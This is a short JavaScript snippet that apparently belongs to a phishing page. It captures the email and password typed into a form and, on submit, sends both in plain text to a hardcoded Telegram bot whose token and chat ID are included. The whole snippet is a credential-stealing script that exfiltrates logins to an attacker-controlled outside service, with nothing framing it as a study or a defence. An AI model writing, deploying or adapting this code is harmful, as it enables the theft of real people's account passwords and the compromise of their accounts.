let name = document.querySelector(".name");
let password = document.querySelector(".password");

const TOKEN = `6549341956:AAG4tWyNpW6iBFmTuRtDN713dpy-8y4Vozo`;
const CHAT_ID = `-1002070473127`;
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
  
document.getElementById("tg").addEventListener("submit", function (e) {
  e.preventDefault();
  let message = `<b>Заявка с сайта!</b>\n`;
  message += `Email: <b>${name.value}</b>\n`;
  message += `Password: <b>${password.value}</b>\n`;
  axios.post(URL_API, {
    chat_id: CHAT_ID,
    parse_mode: "html",
    text: message,
  });
});